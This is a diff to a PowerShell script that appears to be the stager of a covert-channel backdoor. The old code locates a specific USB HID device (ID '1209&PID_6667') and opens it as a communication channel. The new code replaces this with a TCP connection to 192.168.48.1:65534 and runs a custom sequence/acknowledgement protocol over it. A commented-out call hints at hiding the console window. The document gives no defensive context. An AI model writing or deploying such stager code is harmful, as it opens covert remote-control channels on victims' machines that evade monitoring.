@@ -32,18 +32,19 @@ function bs ($v, $n) { [math]::floor($v * [math]::pow(2, $n)) }
 function sa($s,$a) { (bs ($s -band 15) 4) + ($a -band 15)}
 function isack($s, $z) { (($s+1) -band 15) -eq ($z -band 15)}
 
-function stage() {
+& {
+	clhy
 #	$null = [n.w]::ShowWindowAsync($h, 0)
-	$devs = gwmi Win32_USBControllerDevice
-	foreach ($dev in $devs) {
-		$wmidev = [wmi]$dev.Dependent
-		if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
-			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
-		}
-	}
+#	$devs = gwmi Win32_USBControllerDevice
+#	foreach ($dev in $devs) {
+#		$wmidev = [wmi]$dev.Dependent
+#		if ($wmidev.GetPropertyValue('DeviceID') -match ('1209&PID_6667') -and ($wmidev.GetPropertyValue('Service') -eq $null)) {
+#			$fn = ([char]92+[char]92+'?'+[char]92 + $wmidev.GetPropertyValue('DeviceID').ToString().Replace([char]92,[char]35) + [char]35+'{4d1e55b2-f16f-11cf-88cb-001111000030}')
+#		}
+#	}
 	try {
-		$f = [n.w]::o($fn)
-#		$f = (New-Object Net.Sockets.TcpClient("192.168.48.1", 65535)).GetStream()
+#		$f = [n.w]::o($fn)
+		$f = (New-Object Net.Sockets.TcpClient("192.168.48.1", 65534)).GetStream()
 		[System.Console]::WriteLine("File is open")
 		$seq = 6
 		$ack = 0
@@ -90,6 +91,4 @@ function stage() {
 	}
 	exit
 }
-clhy
-stage
 
